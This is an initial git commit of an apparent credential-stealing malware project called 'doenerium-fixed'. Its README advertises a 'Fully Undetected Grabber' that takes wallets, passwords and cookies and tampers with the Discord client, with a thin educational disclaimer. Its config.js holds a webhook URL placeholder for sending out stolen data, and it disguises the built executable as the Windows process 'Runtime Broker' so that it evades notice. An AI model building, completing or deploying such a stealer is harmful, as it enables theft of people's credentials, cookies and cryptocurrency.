b89bee218e084530bf00342797e55ba96a899eb2
Doenerium <tomlebgv9@gmail.com>
2023-09-20 06:45:39 +0200

    Initial commit

---
+++ README.md
@@ -0,0 +1,2 @@
+# doenerium-fixed
+ Fully Undetected Grabber (Grabs Wallets, Passwords, Cookies, Modifies Discord Client Etc.) Disclaimer: We are not responsible for any damages this software may cause after being acquired. This software was made for personal education and sandbox testing.
---
+++ config.js
@@ -0,0 +1,12 @@
+module.exports = () => {
+    return {
+        webhook_url: "REPLACE_ME",
+        icon: './default.ico',
+        properties: {
+            FileDescription: 'Runtime Broker',
+            ProductName: 'Runtime Broker',
+            LegalCopyright: 'Runtime Broker ©️ 2023',
+            OriginalFilename: 'RuntimeBroker.exe'
+        }
+    }
+}
